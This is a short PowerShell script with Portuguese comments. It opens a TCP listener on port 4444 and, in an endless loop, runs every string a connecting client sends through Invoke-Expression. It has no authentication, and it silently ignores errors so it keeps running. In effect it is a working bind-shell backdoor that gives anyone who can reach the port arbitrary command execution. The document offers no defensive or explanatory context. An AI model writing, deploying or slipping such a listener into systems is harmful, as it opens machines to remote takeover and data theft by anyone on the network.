$listener = [System.Net.Sockets.TcpListener]::new(4444)
$listener.Start()
Write-Host "Listening on port 4444…"

# Loop infinito: sempre que um cliente conectar, lê e executa o comando
while ($true) {
    try {
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()
        $buffer = New-Object byte[] 4096
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -gt 0) {
            $cmd = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()
            Write-Host "Executando:" $cmd
            Invoke-Expression $cmd
        }
        $stream.Close()
        $client.Close()
    } catch {
        # Ignora erros e continua o loop
    }
}
